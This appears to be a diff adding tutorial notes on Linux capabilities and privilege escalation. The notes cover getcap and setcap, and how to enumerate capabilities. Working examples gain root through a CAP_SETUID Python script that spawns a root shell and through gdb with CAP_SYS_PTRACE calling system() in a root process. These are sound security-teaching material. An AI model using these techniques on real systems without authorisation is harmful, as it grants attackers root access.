@@ -1,0 +1,275 @@
+                    ________________________________
+
+                       LINUX PRIVILEGE ESCALATION
+                     Linux Capabilities Enumeration
+
+                            Leonardo Tamiano
+                    ________________________________
+
+
+Table of Contents
+_________________
+
+1. Capabilities in Linux
+2. Configuration
+3. Enumeration
+4. Exploitation
+.. 1. Example 1 – CAP_SETUID
+.. 2. Example 2 – CAP_SYS_PTRACE
+5. References
+
+
+1 Capabilities in Linux
+=======================
+
+  Other than the basic file system permissions of read (r), write (w)
+  and execute (x), linux offers a set of fine grained permissions that
+  allows processes to do specific tasks with higher privileges (root).
+
+  Specifically, while tradional UNIX systems distinguish only between
+  two types of processes:
+  - those privileged (euid = 0)
+  - those not privileged (euid != 0)
+
+  From linux `kernel 2.2' onwards, privileges are split into distinc
+  units, known as `capabilities', which can be enabled or disabled
+  (per-thread attribute).
+
+  Capabilities are used to implement the `least privilege' design
+  principle.
+
+  To see a list of all the supported capabilities you can check out the
+  following links:
+  - <https://man7.org/linux/man-pages/man7/capabilities.7.html>
+  - <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities>
+
+  There are 5 `capability sets'
+  - Inherited
+  - Effective
+  - Permitted
+  - Bounding
+  - Ambient
+
+
+2 Configuration
+===============
+
+  To obtain all the capabilities of a given binary, you can use the
+  `getcap' command.
+
+  ,----
+  | leo@ctf:~$ getcap /usr/bin/ping
+  | /usr/bin/ping cap_net_raw=ep
+  `----
+
+  ----------------------------------------------------------------------
+
+  To set a new capability instead you can use the `setcap' command.
+
+  ,----
+  | leo@ctf:~$ sudo setcap 'cap_net_bind_service=ep cap_net_raw=ep' /usr/bin/ping
+  `----
+
+  And with this we have added the new capability `cap_net_bind_service'
+
+  ,----
+  | leo@ctf:~$ getcap /usr/bin/ping
+  | /usr/bin/ping cap_net_bind_service,cap_net_raw=ep
+  `----
+
+  ----------------------------------------------------------------------
+
+  To remove a capability you can also use the `setcap', but with the
+  minus sign `-'.
+
+  ,----
+  | leo@ctf:~$ sudo setcap 'cap_net_bind_service=-ep cap_net_raw=ep' /usr/bin/ping
+  `----
+
+  ,----
+  | leo@ctf:~$ getcap /usr/bin/ping
+  | /usr/bin/ping cap_net_raw=ep
+  `----
+
+
+3 Enumeration
+=============
+
+  To search recursively the file system starting from the root directory
+  you can use `getcap'
+  ,----
+  | getcap -r / 2>/dev/null
+  `----
+
+  To get the capabilities of a process given its PID you can use
+  `getpcaps'
+  ,----
+  | getpcaps <PID>
+  `----
+
+  You can also use the pseudo-fs `/proc'
+  ,----
+  | cat /proc/<PID>/status | grep Cap
+  `----
+
+  You can decode the value using `capsh'
+  ,----
+  | capsh --decode=0000000800000000
+  `----
+
+
+4 Exploitation
+==============
+
+  Some interesting capabilities that can be used for exploitations are
+  listed below:
+
+  - CAP_SYS_ADMIN
+
+    Allows extensive administrative privileges, such as mounting
+    devices.
+
+  - CAP_SYS_PTRACE
+
+    Allows to use debugging and system call tracing functionalities
+    (ptrace).
+
+  - CAP_SYS_MODULE
+
+    Allows to load and unload kernel modules.
+
+  - CAP_SETUID
+
+    Allows to set the effective user id of the created process.
+
+  Other interesting capabilities:
+
+  - CAP_DAC_READ_SEARCH
+  - CAP_DAC_OVERRIDE
+  - CAP_CHOWN
+  - CAP_FOWNER
+  - CAP_SETGID
+  - CAP_SETFCAP
+  - CAP_SYS_RAWIO
+  - CAP_KILL
+  - CAP_NET_BIND_SERVICE
+  - CAP_NET_RAW
+  - CAP_LINUX_IMMUTABLE
+  - CAP_SYS_CHROOT
+  - CAP_SYS_BOOT
+  - CAP_SYSLOG
+  - CAP_MKNOD
+  - CAP_SETPCAP
+
+
+4.1 Example 1 – CAP_SETUID
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Suppose the `python' binary has the `CAP_SETUID' capability.
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ sudo setcap 'cap_setuid=eip' /usr/bin/python3.11
+  | leo@ctf:~/wa/tmp/linux-cap$ getcap /usr/bin/python3.11
+  | /usr/bin/python3.11 cap_setuid=eip
+  `----
+
+  We can exploit it with the following python program
+
+  ,----
+  | #!/usr/bin/python3
+  | 
+  | import os;
+  | import pty;
+  | 
+  | os.setuid(0);
+  | pty.spawn("/bin/bash")
+  `----
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ python3 cap_setuid.py 
+  | root@ctf:~/wa/tmp/linux-cap# whoami
+  | root
+  `----
+
+
+4.2 Example 2 – CAP_SYS_PTRACE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Suppose the `gdb' binary has the `CAP_SYS_PTRACE' capability.
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ sudo setcap 'cap_sys_ptrace=+ep' /usr/bin/gdb
+  | leo@ctf:~/wa/tmp/linux-cap$ getcap /usr/bin/gdb
+  | /usr/bin/gdb cap_sys_ptrace=ep
+  `----
+
+  We can exploit it in many different ways including the following one
+
+  ----------------------------------------------------------------------
+
+  The exploitation method consist in debugging a python script that runs
+  as root and using the `call' command.
+
+  Consider for example the following python script.
+
+  ,----
+  | #!/usr/bin/env python3
+  | 
+  | def main():
+  |     name = input("Give me your name: ")
+  |     print(f"Hello {name}!")
+  | 
+  | if __name__ == "__main__":
+  |     main()
+  | 
+  `----
+
+  Assume that a root user is executing the script.
+
+  ,----
+  | ┌──(root㉿ctf)-[/home/leo/wa/tmp/linux-cap]
+  | └─# python3 python-root.py 
+  | Give me your name: 
+  `----
+
+  ----------------------------------------------------------------------
+
+  The malicious user can use `ps aux' to understand the PID of the root
+  process being executed.
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ ps aux | grep python
+  | root        1008  0.8  0.1  17252  9600 pts/1    S+   20:47   0:00 python3 python-root.py
+  | leo         1016  0.0  0.0   3344  1664 pts/2    S+   20:47   0:00 grep python
+  `----
+
+  we can use `gdb' with the `-p' option to hook into the process and
+  start debugging.
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ gdb -p 1008
+  `----
+
+  at this point we can simply execute the `system' function with the
+  `call' command.
+
+  ,----
+  | pwndbg> call system("touch /tmp/test")
+  `----
+
+  and at the end, even though the program crashed, the command is
+  actually executed as the root user.
+
+  ,----
+  | leo@ctf:~/wa/tmp/linux-cap$ ls -lha /tmp/test
+  | -rw-r--r-- 1 root root 0 Aug 24 20:47 /tmp/test
+  `----
+
+
+5 References
+============
+
+  - <https://man7.org/linux/man-pages/man7/capabilities.7.html>
+  - <https://man7.org/linux/man-pages/man8/getcap.8.html>
+  - <https://stackoverflow.com/questions/35469038/how-to-find-out-what-linux-capabilities-a-process-requires-to-work>
+  - <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities>
